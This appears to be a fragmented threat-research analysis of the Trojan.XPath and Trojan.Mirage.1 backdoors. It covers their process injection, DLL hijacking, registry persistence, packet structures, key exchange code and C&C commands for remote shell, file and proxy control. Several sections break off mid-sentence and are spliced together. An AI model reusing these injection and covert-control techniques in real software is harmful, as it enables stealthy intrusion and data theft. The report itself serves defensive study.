leftover debugging information that reveals the paths and\nsource code file names:\n\nz:\\\\desk_codes\\\\project_xpath\\\\xpathinstaller\\\\client_files.h\nz:\\\\desk_codes\\\\project_xpath\\\\xpathinstaller\\\\MemLoadDll.h\nxPathInstaller.c\n\nThe original function names are:\n\nInstallSecFunDriver\nMyZwLoadDriver\nSetMyLoginInfo\nInstallDrv\n\nThe file also contains various debugging messages:\n\nstart TRUE:%s,%d\\n\n pOpenSCManager false:%s,%d\\n\n ZwLoadDriver false1 :%s,%d,%d\\n\n ZwLoadDriver false2 :%s,%d,%d\\n\n ZwLoadDriver false3 :%s,%d,%d\\n\n ZwLoadDriver false1 :%x\\n\n ZwLoadDriver ok : %x\\n\nZwLoadDriver false: %x\ntype:%d\\n\n\ninstall all failed\\n\n can not pCreateFile,inst failed :%s,%d\\n\n%s,%d,%d\\n\nadmin:%d,dwCPBA:%d,dwLUA:%d,om:%d-%d\n\nThe setinfo false string is the most interesting. It contains the 0xACA3 sybmol, which in\nUnicode corresponds to the \n hieroglyph. This hieroglyph is used in South and North Korean\nwriting. \n\nTrojan.XPath.2\n\nTrojan.XPath.2 is a driver for the multi-function XPath backdoor. It has two versions for both\n32-bit and 64-bit Microsoft Windows operating systems. The component is designed to\ninject the payload loader into the lsass.exe process, as well as for traffic filtering. \n\nOperating routine\n\nTrojan.XPath.1 serves as a loader for the driver. Operating in Windows starting from Vista or\nhigher is based on the source code of the WinDivert 1.1 (30.06.2013) - 1.2 (17.07.2015).\nOperating in Windows starting from Windows 2000 up to Vista is based on the source code\nof the WinPcap.\n\n \n\f12\n\n12\n\nDrivers have the following digital signatures:\n\nCN = Anhua Xinda (Beijing) Technology Co., Ltd.\n\nOU = Digital ID Class 3 - Microsoft Software Validation v2\n\nO = Anhua Xinda (Beijing) Technology Co., Ltd.\n\nL = Beijing\n\nS = Beijing\n\nC = CN\n\nCN =  \n\nO =  \n\nL =  \n\nS =  \n\nC = CN\n\nThe trojan obtains the addresses of the necessary functions from a NDIS.SYS file:\n\nIt then checks which of the available modules \u2014 hal.dll, halmacpi.dll or halacpi.dll \u2014 was\nloaded, and gets the addresses of several functions from it:\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fNext, it checks if the ntdll.dll module is loaded. If it is not loaded, Trojan.XPath.2\nindependently maps the file into the memory, and gets the addresses of the necessary\nfunctions:\n\n13\n\n13\n\nThen trojan creates the device \\\\Device\\\\test1 and the symbolic link \\\n\\DosDevices\\\\test1.\n\nVia PsSetCreateProcessNotifyRoutine it sets a callback function in which it tracks the\nlsass.exe process creation. As soon as this process is started, the trojan reads the loader\nmodule (Trojan.XPath.3) from the registry [\\\\registry\\\\machine\\\\SOFTWARE\\\n\\Microsoft\\\\LoginInfo] 'DirectDraw'. Then it unpacks it and injects it into the\nlsass.exe. In the 64-bit version of the driver, code is injected via the\nPsSetLoadImageNotifyRoutine function.\n\nThe program waits until it can open \\\\Systemroot\\\\explorer.exe, then via\nIoCreateDriver it creates the \\\\FileSystem\\\\FsBaiduHips driver.\n\nIt records the following values in the registry:\n\n \n\f14\n\n14\n\n\u00b7 [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n\n\\yyyyyyyyGoogle] 'Group' = ", "HKCU\\Software\\Mic\nrosoft\\Windows\\Cu\nrrentVersion\\Inte\nrnet Settings\nregistry key opening\nfailed\n\n0x06\n\n0\n\nA not find proxy\naddress string which\nis encoded inside the\nbody of the trojan.\n\nAdded if\nProxyServer registry\nparameter value\nreceiving failed\n\n\f0x03\n\n0x04\n\n0x02\n\n0x10\n\n0\n\n0\n\n1\n\n2\n\n0\n\n0\n\nNo entry\n\nNo entry\n\nNo entry\n\nNo entry\n\nNo entry\n\nNo entry\n\n42\n\n42\n\nAdded when a system\ninformation packet is\nsent through the proxy\nserver, whose address\nis encoded inside the\ntrojan body\n\nAdded when system\ninformation is sent\nthrough the proxy\nserver:\n\nfrom the registry\nsection HKCU;\n\nreceived using WinHTTP\nAPI;\n\nfrom the\nHKU\\<session_user\n_SID> registry section\n\nAdded when system\ninformation is sent\ndirectly to the server\n\nAdded after system\ninformation is sent to\nthe server and before a\nthread with heartbeats\nis launched\n\nTrojan.Mirage.1\n\nTrojan.Mirage.1 is a multi-component backdoor trojan designed for Windows 32-bit\noperating systems. It is used for unauthorized control of infected computers and accessing\ninformation stored on them. The infection is implemented through a loader injection into\nthe valid running system process. The payload unpacking and arbitrary code execution is\ndone on the infected computer\u2019s RAM.\n\nOperating routine\n\nTrojan.Mirage.1 has the following file suite:\n\n\u00b7 WmiPrvServer.exe \u2014 file with a valid HP digital signature:\n\nCN=Hewlett-Packard Company\nOU=Hewlett-Packard Company\n\n\f43\n\n43\n\nOU=Digital ID Class 3 - Microsoft Software Validation v2\nO=Hewlett-Packard Company\nL=Palo Alto\nS=California\nC=US\n\n\u00b7 rapi.dll \u2014 the loader. It loads on the WmiPrvServer.exe process using the DLL\n\nHijacking method,\n\n\u00b7 cmdl32.dat \u2014 the encrypted shell code with the payload,\n\n\u00b7 config.dat \u2014 the encrypted configuration.\n\nRapi.dll loader module\n\nThe loader module is injected into the WmiPrvServer.exe process using the DLL Hijacking.\nThe program receives the GetProcAddress function address through the PEB (Process\nEnvironment Block) structure by comparing the strings. After that it receives the addresses of\nthe necessary imported functions: \n\n\u00b7 LoadLibraryA\n\u00b7 GetModuleFileNameA\n\u00b7 VirtualAlloc\n\u00b7 CloseHandle\n\u00b7 CreateFileA\n\u00b7 GetFileSize\n\u00b7 ReadFile\n\nNext, the cmdl32.dat file, located in the same directory from where the parent process of the\ntrojan was launched, is read. The loader decrypts the file using the XOR operation with the\n0x88 byte and jumps to the decrypted buffer using the JMP instruction.\n\n\f44\n\n44\n\nThe encrypted shellcode cmdl32.dat\n\nAt the start, the shellcode calculates the size of the payload. The beginning of the payload is\nfound through the call of the last shellcode function, and its end is determined by the\n0xDDCCBBAA signature.\n\n\f45\n\n45\n\nNext, the program receives the list of necessary imported functions. Through the PEB\nstructure, the trojan locates the GetProcAddress function, which it instantly uses to get the\nLoadLibraryA function address. The search for the rest of the imports is done through\nthese two functions.\n\nstrcmp\n\nmemcpy\n\nVirtualAlloc\n\nVirtualProtect\n\nWriteFile\n\nlstrcatA\n\nGetModuleHandleA\n\nIsDebuggerPresent\n\nNext, Trojan.Mirage.1 decrypts the payload using the XOR operation with the 0xCC byte,\nloads the resulting MZPE file onto the memory and calls the mystart exported function.\n\n\f46\n\n46\n\nThe payload\n\nThe payload module represents a dynamic library with the exported functions:\n\n\u00b7 OnWork\n\u00b7 RunUninstallA\n\u00b7 Uninstall\n\u00b7 mystart\n\nBelow, we will dissect two major functions responsible for the trojan operation: mystart\nand OnWork.  \n\nmystart function\n\nAt the beginning, the %TEMP%\\\\installstat.tmp file is checked to be present. If it exists,\nTrojan.Mirage.1 reads a proxy server address from it and then deletes this file.\n\nThe c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32 path is used as a home directory,\nherewith the creation, modification and access date for the c:\\\\programdata\\\\Tmp\\\n\\cmd32\\\\cmd32 and c:\\\\programdata\\\\Tmp\\\\ folders are copied from the %WINDIR%\n\\\\System32\\\\winver.exe file.\n\nThe Global\\\\dawdwere4de2wrw mutex is used to ensure that only one instance of the\nmalware is running.\n\nAt this stage, the program checks for the presence of the avp.exe and avpui.exe\nprocesses. If even one of them is found, then throughout its further operation the trojan will\nadditionally verify the presence of the object with the Global\\\\v2kjgtts1 event name. If\nit locates it, the trojan will halt its further operation.\n\nTrojan.Mirage.1 can operate in 3 modes. While operating as a service, it checks if the event\nobject with the Global\\\\v2kjgtts1 name exists. If the event object is missing, it copies\nits files from the current directory onto c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32 and\ninjects either into the iexplore.exe process (for the Windows systems, starting from\nWindows Vista and higher) or into the explorer.exe process (for the Windows systems\nbelow Windows Vista).\n\nWhile operating in the context of the explorer.exe or iexplore.exe processes, it\ndeletes its files from the %TEMP% directory, checks if the Global\\\\dawdwere4de2wrw\nmutex is present and creates it if missing. If the trojan is launched with elevated privileges, it\ncreates the Windows Event Update service; otherwise, it configures its autorun through the\n[HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows]\n'Load' registry key and proceeds to execute its main functions.\n\n\f47\n\n47\n\nFor the rest of the cases, Trojan.Mirage.1 checks for the Global\\\\dawdwere4de2wrw\nmutex. If it is missing, the malware injects either into the iexplore.exe process (for the\nWindows systems, starting from Windows Vista and higher) or into the explorer.exe\nprocess (for the Windows systems below Windows Vista).\n\nOnWork Function\n\nAfter receiving the imported functions, the application proceeds to execute its main\nfunctions, skipping installation onto the system routine.\n\nIt reads the c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32\\\\config.dat file and decrypts\nit using the following algorithm.\n\nThe configuration has the following structure:\n\nstruct st_config\n{\n  char cnc_addr[32];\n  char cnc_port[16];\n  char interval[16];\n  char timeout[16];\n  char unk3[16];\n  _DWORD unk4;\n  char trojan_name[16];\n  _DWORD unk5;\n  wchar_t campaign[32];\n};\n\nNext, Trojan.Mirage.1 collects various information about the infected computer and forms\nthe following structure:\n\nstruct st_info\n{\n  wchar_t version[32];\n  wchar_t pc_name_user[64];\n  wchar_t bot_ip[64];\n  wchar_t macaddr[64];\n\n\f48\n\n48\n\n  _DWORD osver;\n  _DWORD cpufreq;\n  _DWORD cpunumber;\n  _DWORD physmem;\n  _DWORD is_wow64_process;\n};\n\nThe %s-v1.0-%s line is stored in the version field; with that, the v1.0 value is hardcoded\nin the analyzed sample, while the two other lines, trojan_name and campaign, are taken\nfrom the settings.\n\nNext, an attempt to connect to the C&C server is made. To do so, the trojan checks for the\nproxy server settings in the [HKCU\\\\Software\\\\Microsoft\\\\Windows\\\n\\CurrentVersion\\\\Internet Settings] 'ProxyEnable' and [HKCU\\\n\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings]\n'ProxyServer' registry entries. If settings are found, the trojan uses the corresponding\nproxy server in its further requests.\n\nTrojan.Mirage.1 connects to the C&C server listed in its configuration and sends the\nfollowing packet:\n\nstruct st_hello\n{\n  _DWORD dword0; // 'f'\n  _DWORD dword4; // random value\n  _DWORD dword8; // random value\n  _DWORD dwordC; // random value\n  wchar_t text[256]; // ", "HKLM\\\\SOFTWARE\\\n\\BINARY] 'ESETSrv\u2019 and [HKLM\\\\SOFTWARE\\\\BINARY] 'ESETSrv\u2019 registry keys.\nMalware spoofs the files\u2019 time attributes by changing them to the ntdll.dll system file\u2019s\nattributes.\n\nTo set itself as a service, the trojan creates and launches the\nSERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS service with\nautomatic startup. Its name, display name and the description are taken from the\nconfiguration (stored in the config.service_name, config.ServiceDisplayName,\nconfig.ServiceDescription parameters). The lpBinaryPathName parameter of the\nCreateService function is set as <path>\\EHSrv.exe -app.\n\nTo write itself into the registry, the trojan creates the <path>\\EHSrv.exe -app registry\nvalue. The descriptor, key name and values are set in the configuration:\n\n \n\f85\n\n85\n\nThe trojan then starts a new process.\n\nThis is followed by the StartServiceCtrlDispatcherW function call that initializes the\nservice.\n\nThe config.process_injection_flag flag is checked in the configuration. If the flag is\nset, the trojan refers to the configuration for the extracting path to the executable file of the\nprocess that is used for shellcode injection. The name may contain environment variables.\nThere are four names and each of them are sequentially checked up to the first non-zero\nvalue. Then the trojan creates a process with the CREATE_SUSPENDED flag in which the\nshellcode is injected.\n\nUpon successful injection, the process shuts down. In case of failure, the trojan transfers\ncontrol to the main functionality.\n\n", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", "HKLM\\\n\\SOFTWARE\\\\Microsoft\\\\LoginInfo] or [HKCU\\\\SOFTWARE\\\\Microsoft\\\n\\LoginInfo] where the payload is stored. It then unpacks the payload using the APLib\nlibrary.\n\n\fNext, the trojan allocates a memory block of 0xC80F0 bytes. At the beginning of the block it\nforms the following structure:\n\n20\n\n20\n\n#pragma pack(push,1)\nstruct mod\n{\nchar char0[128];\n_QWORD LdrLoadDll;\n_QWORD LdrGetProcedureAddress;\n_QWORD ZwProtectVirtualMemory;\n_QWORD ZwCreateSection;\n_QWORD ZwMapViewOfSection;\n_QWORD qwordA8;\n_QWORD NtTerminateThread;\n_QWORD qwordB8;\n_QWORD qwordc0;\n_QWORD is_x64;\n_QWORD payload_size;\n_QWORD qwordd8;\n_BYTE payload[payload_size];\n};\n#pragma pack(pop)\n\nHerewith, in the analyzed sample the char0 value represents a asdsad11111222333\nconstant.\n\nThe trojan allocates a memory block of the size of 0xD80F0 bytes to the previously launched\nsvchost.exe process and copies the entire region of 0xC80F0 bytes onto it.\n\nNext, Trojan.XPath.3 searches for the 0x12345688 constant, which is located in the\nshellcode built into it and replaces it with the memory block address, previously allocated in\nthe svchost.exe process. It then copies this shellcode onto the allocated block using the\n0xC90F0 offset.\n\nFor systems below Windows 8, the trojan receives CONTEXT of the thread in the svchost.exe\nprocess and patches the RIP/EIP register with the shellcode, adding 8 bytes to it. For more\nrecent OS versions, Trojan.XPath.3 launches the thread through NtCreateThreadEx.\n\nArtifacts\n\nTraces of the debug information inside the trojan library allow finding the name of the\ntrojan\u2019s source code file: PayloadDll.c.\n\nVarious debugging messages, which are stored in the library:\n\nos ver:%d,%d,%d\npayload_%04d-%02d-%02d_%02d-%02d-%02d.dmp\nget target api address false\\n\ndepack get packed size error:%d\\n\ndepack false\\n\nAlloc Mem in target process false!!!\\n\nwriting info to target process false!!!,%d,%d,%x\nget magic false\\n\n\n\f21\n\n21\n\nwriting stub to same architecture process:%p\\n\nwriting payload to target process false!!!,%d\nGetProcessEntryPoint is:%x\\n\n!OpenProcessToken,%d\\n\n!DuplicateTokenEx,%d\\n\nget TokenInformation,%d\\n\n!SetTokenInformation,%d\\n\n!pCreateEnvironmentBlock,%d\\n\n!xOpenProcess \\n\nloader path:%s\\n\nCreaet Process All Failed ERROR=%d\\n\ntry gen info\\n\ngen info ok\\n\nWritePayloadToRemote false\\n\nwrite info ok\\n\nerror thread\nGetThreadContext Error\\n\nGetThreadContext eip:%p\\n\nset thread context error\\n\nSetThreadContext eip:%p\\n\ncreate thread ok\\n\nget func error in payload\\n\nget lib error in payload\\n\ntry runthread in payload\\n\nin payload\\n\n\nTrojan.XPath.4\n\nA multifunctional backdoor trojan for the 32-bit and 64-bit versions of the Microsoft\nWindows operating systems. It is one of the components of the Trojan.XPath trojan family. It\nis used for granting unauthorized access to infected computers and performing various\nmalicious actions upon attackers\u2019 commands.\n\nTrojan.XPath.4 is written in C++ and created using several open source projects. One of them\nis the Cyclone TCP library designed for low-level operation within the network. Malware\ncreators modified it to use the WinDivert driver instead of the WinPcap driver. The second\nproject is the modified libdsm library, which implements the operation through the SMB\nprotocol.\n\nOperating routine\n\nThe trojan reads and decrypts the configuration file from the Video or Scsi parameter\nstored in the [HKLM\\\\SOFTWARE\\\\Microsoft\\\\LoginInfo] registry key. It then\nverifies if the first 4 bytes coincide with the 1E 5A CF 24 value and if the 16th bite equals\n0xCE.\n\nNext, Trojan.XPath.4 forms a unique HWID (Hardware ID) identifier of the infected device,\nbased on its hardware configuration.\n\nAfter that, it opens the device \\\\.\\BainduHips to verify the network driver is available.\nDepending on the operating system version, any calls to the driver are performed in a\n\n\f22\n\n22\n\nspecific way. The first one is executed in the Windows operating system versions, starting\nfrom Windows 2000 and ending with Windows Server 2003 R2 where the WinCap-based\ndriver is used. The second one is executed on newer versions of Windows where the\nWinDivert-based driver is used.\n\nIn order to determine through which network interfaces the trojan should work, it searches\nfor the network interfaces with types MIB_IF_TYPE_ETHERNET and\nIF_TYPE_IEEE80211, which are connected to the network. If Trojan.XPath.4 is running on a\nWindows version earlier than Windows Vista, it sends the IOCTL code 0x80000800 to its\ndriver. After this IOCTL code is received, the driver installs its own hooks onto the handlers,\nwhich are responsible for various functions of the TCP/IP protocol.\n\nBased on that, the trojan can operate in two modes. In the first mode, it functions as a client\n(Client Mode), connecting to the C&C server and waiting for the corresponding commands.\nIn the second mode, the trojan operates as an agent (Agent Mode), listening to the specific\nports, and waiting for other clients to connect and receive their corresponding commands. In\nthis mode, Trojan.XPath.4 acts as a server.\n\nOperation in the Agent (Server) Mode\n\nWhile working with the network driver, Trojan.XPath.4 does not actually listen to or receive\nconnections on a port. Instead, the driver listens for traffic on the network interface and\nsends filtered packets to the trojan. As a result, the port, to which the trojan listens, is not\nshown as opened anywhere.\n\nTrojan.XPath.4 checks the current day of the week and the time set in the system settings and\ncompares their values with the data from the configuration file. In this file, there is flag for\neach hour of each day of the week, which inform the trojan if it should run at that specific\ntime. If there is no flag for the current time, the malware will not receive any packets.\n\nTrojan.XPath.4 waits for an incoming packet of 32 bytes. Next, it takes the first 4 bytes as an\nXOR key to decrypt the remaining 28 bytes. The decryption algorithm is shown in the picture\nbelow:\n\n\f23\n\n23\n\nAfter decryption, it verifies bytes 4 through 12 and does not perform any further actions if\nthese bytes match the string 1I2#aLeb. If this string is not present, the trojan attempts to\ndecrypt the packet with the AES key instead of the XOR key. Next, the trojan verifies if the\nfirst 4 decrypted bytes match the string 7r#K. If there is no match, the trojan will determine\nan error has occurred, and all further packet processing will be stopped. But in case there is a\nmatch after decryption, this packet will have the following structure:\n\n#pragma pack(push,1)\nstruct st_packet_header\n{\n_BYTE com_flag[4];\n_DWORD packed_size;\n_DWORD decomp_size;\n_DWORD cmdid;\n_BYTE pad[16];\n};\n#pragma pack(pop)\n\nIf the packed_size field has 32 value, and the decomp_size field has the value of 0, the\ntrojan verifies if there is a tunnel to another bot created. If the tunnel exists, Trojan.XPath.4\nredirects the command into it, so that the connected bot can execute it. If there is no tunnel,\nthe trojan executes the command itself. \n\n\f24\n\n24\n\nIf the values of the field mentioned earlier are different from those the trojan expects, it will\nround off the size of the packed_size field to the larger value, multiple to 16, which\nrepresents the size of packet\u2019s payload. After that, it receives the rest of the data, decrypts it\nwith one of two AES keys and unpacks it with the LZMA algorithm. Next, it verifies if the size\nof the unpacked data matches the size presented in the decomp_size field of the\nst_packet_header packet. If the site match is confirmed, Trojan.XPath.4 sends the\nreceived command into the tunnel or executes it on its own if the tunnel was not created. \n\nOperation in the Client Mode\n\nThe trojan will run in this mode if the configuration file contains the C&C server address and\nthe operation mode 3, which corresponds to the Client Mode, is specified. The malware\nsample analyzed has a 4 mode specified, which corresponds to the Agent Mode.\n\nThe trojan generates a random port number within the range of \n65530 and connects to it.\n\nNext, it forms the following packet:\n\n#pragma pack(push,1)\nstruct st_hello\n{\n_DWORD key;\n_BYTE magic[8]; // ", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI branch have the values\nof oci.dll and %systemroot%\\system32 accordingly. When the trojan is placed in %\nsystemroot%\\system32\\oci.dll, it will be automatically loaded onto the memory\nwhen the MSDTC starts.\n\nWhen initialized, it creates a gfhfgh6y76734d,1111 mutex, followed by the library\nloading and the MyInstall exported function call.\n\nMyInstall\n\nThe trojan can determine if the proxy server should be used and can perform a basic\nauthentication and authorization via the NTLM protocol. When running, it logs records in the\njournal, saving it as c:\\programdata\\logos.txt.\n\nIt connects to the C&C server and exchanges the keys with it. All subsequent packets\nbetween the trojan and the server are encrypted. The algorithm based on the XOR operation\nwith the buffer length of 28 bytes is used for decryption. All packets are encrypted with an\n\n\fend-to-end offset in the buffer; but for the encryption and decryption, separate counters are\nused.\n\nThe following structure is used to request commands from the server and send the results:\n\n68\n\n68\n\n#pragma pack(push, 1)\nstruct st_getcmd\n{\n  _DWORD sig;\n  _DWORD cmd;\n  _DWORD res;\n  _DWORD dwordc;\n};\n#pragma pack(pop)\n\nThe sig parameter always has a 0x03 value. To request the command from the server, the\ncmd parameter is set as 0x200, and the res and dwordc parameters are set to zero. If the\nserver does not send any data within 44 seconds, the trojan sends a packet containing the\ncmd parameter with the 0x00 value. This process repeats until any response is received from\nthe server.\n\nCommands list \n\nThe commands the trojan can execute, as well as its response to them, are shown below:\n\n\u00b7 0x00 \u2014 lack of the reply, awaiting the next command;\n\u00b7 0x01 (collecting information about the bot) \u2014 replies with the cmd_botinfo structure:\n\n#pragma pack(push, 1)\nstruct cmd_botinfo_int\n{\n  _DWORD sig; // 0x03\n  _DWORD OSMajorVersion;\n  _DWORD OSMinorVersion;\n  _DWORD OSPlatformId;\n  _DWORD userpriv;\n  _DWORD botip;\n  _QWORD MemTotalPhys;\n  _BYTE macaddr[6];\n  wchar_t szCSDVersion[128];\n  wchar_t hostname[64];\n  wchar_t username[64];\n  char connect_string[256];\n};\n\nstruct cmd_botinfo\n{\n  _BYTE sig; // 0x03\n  _WORD len; // 0x3AC\n  _WORD cmdid;\n  _BYTE gap[10];\n  cmd_botinfo_int info;\n};\n#pragma pack(pop)\n\n \n\f69\n\n69\n\n\u00b7 0x02 (remote shell launch) \u2014 replies with the packet, similar to the one received from the\n\nserver;\n\n\u00b7 0x03 (advanced file system manager launch) \u2014 replies with the packet, similar to the one\n\nreceived from the server;\n\n\u00b7 0\u044505 (remote shell v2 launch) \u2014 replies with the packet, similar to the one received from\n\nthe server;\n\n\u00b7 0x06 (proxy manager launch) \u2014 replies with the packet, similar to the one received from\n\nthe server;\n\n\u00b7 0x100 (the ping command) \u2014 replies with cmd=0x00;\n\u00b7 0x400 (the command to reconnect to the server) \u2014 replies with cmd=0x300;\n\u00b7 0x600 (dummy command) \u2014 replies with cmd=0x600; res=0xffffffff;\n\u00b7 0x700 (launch of the command through ShellExecute) \u2014 replies with cmd=0x700; if\n\nfailed, replies with res=0xffffffff.\n\nExchanging keys\n\nThe process of exchanging keys with the C&C server is as follows: \n\nUsing random values, the trojan initializes the buffer with the size of 28 bytes. Next, it takes\nthe data array of the 58 bytes size, which is embedded into its body.\n\nIt encrypts bytes from 15 to 43, based on the XOR operation algorithm, using randomly\ngenerated bytes, and sends the resulting buffer to the server. In response, it should receive 5\nbytes, where 0x16 is a 0 byte and the htons function results from WORD, starting with the\nthird byte, which is the size of the next packet, and shouldn\u2019t exceed 0x3FF9 bytes.\n\nAfter that, it receives the next packet, whose data is used in the next exchange.\n\nNext, the trojan uses the second encoded buffer with the size of 332 bytes.\n\n\f70\n\n70\n\nThe trojan encrypts the bytes, starting from 9 to 265 and from 304 to 332, with the algorithm\nbased on the XOR operation, using randomly generated bytes. 28 bytes, starting from 276\nbytes, is replaced with the data generated upon the first buffer initialization. There must be a\nresponse of 5 bytes, where the 0 byte is 0x14, and the htons function results from WORD,\nstarting with the 3rd byte, which is the size of next packet, and should not exceed 0x3FF9\nbytes.\n\nAfter that, it receives the next packet, whose data is not used in further exchange.\n\nNext, the trojan receives 5 bytes from the C&C server, where 0x16 is the 0 byte, and the\nhtons function results from WORD, starting with the 3rd byte, which is the size of the next\npacket, and should not exceed 0x38 bytes.\n\nIt receives the next packet from the C&C server and sends 0\u044538 bytes into the encryption\nkey initialization function:\n\n__int64 __fastcall CCrypt::GenKeys(ccrypt *this, _BYTE *ext_key)\n{\n  __int64 result; // rax\n  int i; // [rsp+0h] [rbp-18h]\n  for ( i = 0; i < 28; ++i )\n  {\n    this->key[i] ^= ext_key[i];\n    this->key[i] ^= ~(_BYTE)i;\n    if ( !this->key[i] )\n      this->key[i] = ~(_BYTE)i;\n    result = (unsigned int)(i + 1);\n  }\n  return result;\n}\n\n\f71\n\n71\n\nRemote Shell Function\n\nThe trojan copies %WINDIR%\\System32\\cmd.exe into %WINDIR%\\System32\\alg.exe.\nIt then initializes a new connection to the C&C server and sends the following packet:\n\n#pragma pack(push,1)\nstruct cmd_remoteshell\n{\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x02\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n};\n#pragma pack(pop)\n\nNext, it launches a scanned alg.exe with the pipes input/output redirection. If the launch fails,\nit runs a cmd.exe instead of the alg.exe. If there is data in the output function pipe, the trojan\nsends the data to the server in the following packet:\n\n#pragma pack(push,1)\nstruct cmd_remoteshell_out\n{\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x202\n  _BYTE gap[10];\n  wchar_t buffer[];\n};\n#pragma pack(pop)\n\nHerewith, the trojan periodically checks for data from the C&C server and parses the\nincoming command when the data has been received.\n\nList of Remote Shell Commands\n\nCommand\n\nDescription\n\n Argument\n\nResponse\n\n0x100\n\n0x102\n\n0x103\n\nkeep-alive mode\n\n-\n\ncmd = 0x00\n\nexecutes the command\nin the Remote Shell\n\nlaunches the file\nmanager (writing into\nthe end of existing file)\n\na command\n\n-\n\na path to the file, the\nfinal size of the file\n\ncmd value is identical to\nthe value in the packet\nreceived from the\nserver;\n\nres = -1 if failed;\n\n\f0x203\n\n0x703\n\nlaunches the file\nmanager (reading from\nthe file)\n\na path to the executable\nfile, an offset in the file\n\nlaunches an application\n\na path to the executable\nfile and arguments\n\nthe remaining variants\n\ndefault behavior\n\n-\n\n72\n\n72\n\nres = 0 if succeed.\n\nres = -1 if failed;\n\nres = 0 if succeed.\n\ncmd value is identical\nto the value of the\npacket received from\nthe server;\n\nres = 1.\n\nRemote Shell v2\n\nThe trojan copies %WINDIR%\\System32\\cmd.exe into the %WINDIR%\n\\System32\\alg.exe. It then initializes a new connection to the C&C server and sends the\nfollowing packet:\n\n#pragma pack(push,1)\nstruct cmd_remoteshell\n{\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x02\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n};\n#pragma pack(pop)\n\nNext, it launches a copied alg.exe; if launch has failed, it runs a cmd.exe instead of the\nalg.exe. Input/output to the launched process is implemented via the trojan process joining\nto the console of the launched alg.exe/cmd.exe process, using the WINAPI\nAttachConsole.\n\nThe rest of the operation routine is similar to the one in the Reverse Shell handler.\n\nFile manager\n\nThe trojan initializes a new connection to the C&C server and sends the following packet:\n\n#pragma pack(push,1)\nstruct cmd_fileop\n{\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd;\n\n\f73\n\n73\n\n  _WORD gap;\n  _DWORD res;\n  _DWORD filesize;\n  _BYTE macaddr[6];\n};\n#pragma pack(pop)\n\nThe cmd value is set to the same value in the server packet. Next, the trojan receives\ncommands from the server.\n\n\u00b7 0x103:\n\nChecks for the file availability. If it does not exist, it sends the packet with the res = 0xB7\nvalue;\n\nTries to open the file in append mode. If failed, it sends the packet with the res = 0x52\nvalue;\n\nReceives the file size and sets filesize filed to the corresponding value in the\nsubsequent packets;\n\nReceives packets in a cycle with the cmd = 0x303 packet value, and writes the data into\nthe file until the file size is larger or equal to the one the server indicated in the first\npacket.\n\u00b7 0x203:\n\nTries to open the file in reading mode. If failed, it sends the packet with the res = 0x02\nvalue;\n\nReceives the file size and sends it to the server in the packet;\n\nIn a cycle, it reads the file, starting from the offset, which is indicated in filesize of the\nfirst packet received from the server, and sends the data in the packet with the cmd =\n0x303 value to the server until the file hasn\u2019t been read to its end.\n\n\u00b7 0x403:\n\nIf the C&C server sends the path as an argument, the trojan lists the files and folders\navailable in this path (not recursively) and sends the collected information with the cmd =\n0x403 value to the server;\n\nIf the C&C server does not specify the argument or if the first symbol of the argument is\n'/'or '\\\\', the trojan lists every storage device and collects the data, including the disk\ntype, its size and free space available, and then sends this data to the server in the packet\nwith the cmd = 0x403 value.\n\n\u00b7 0x503:\n\nMoves a file (the initial and final paths are specified by the C&C server). In response, it\nsends the packet with the cmd = 0x503 and res = 0 values if succeeded; otherwise, it\nsends the packet with the res = -1 value.\n\n\u00b7 0x603:\n\n\f74\n\n74\n\nDeletes the file located in the path, specified by the server. In response, it sends the packet\nwith the cmd = 0x603 and res = 0 values if succeeded; otherwise, it sends the packet\nwith the res = -1 value.\n\n\u00b7 0x703:\n\nLaunches an application specified by the server by using specific arguments. In response, it\nsends the packet with the cmd = 0x703 and res = 0 values if succeeded; otherwise, it\nsends the packet with the res = -1 value.\n\nProxy manager\n\nThe trojan initiates a new connection to the server and sends the following packet to it:\n\n#pragma pack(push,1)\nstruct cmd_proxy\n{\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x06\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n};\n#pragma pack(pop)\n\nNext, it receives the commands from the server.\n\n\u00b7 0x106:\n\no Opens one of the available ports;\n\no Sends a packet with the cmd = 0x506 value to the server;\n\no Connects to the targeted server using the IP and port, specified by the C&C server; \n\no Waits for the incoming connection to its port. Upon receiving the data, it sends it to the\n\nserver it is connected to;\n\no If the trojan receives the data from the targeted server, it sends it to the C&C server in\n\nthe packet with the cmd = 0x116 value;\n\no Returns to waiting for the incoming connection to its port. Upon receiving the data, it\n\nsends it to the server it is connected to.\n\n\u00b7 0x116:\n\nIf there is an incoming connection to a previously opened port, the trojan sends the raw\ndata to the client without using the encryption standard to the trojan.\n\n\u00b7 0x126:\n\nStops the proxy and closes all opened connections.\n\n\u00b7 0x206:\n\no Sends the packet with the cmd = 0x506 value to the C&C server;\n\no Opens a port specified by the server;\n\n\f75\n\n75\n\no Waits for the incoming connection to the specified port;\n\no Connects to the targeted server specified by the C&C server;\n\no Forwards the traffic from the local port to the remote server and backwards as raw\n\ndata, not using the encryption, standard to the trojan.\n\n\u00b7 0x306:\n\no Receives two ports as an argument;\n\no Sends the packet with the cmd = 0x506 value to the C&C server;\n\no Opens first port (master port) and waits for the connection;\n\no Opens the second port (client port) and waits for the connection;\n\no Opens a random port and sends its number to the target, which is currently connected\nto the master port. Next, it waits for the incoming connection on the specified port;\n\no Forwards the traffic between the clients, which connected to the master port and\n\nrandom port..\n\n\u00b7 0x406:\n\no Receives two pairs of IP:port as an argument;\n\no Connects to the first server and receives 2 bytes from 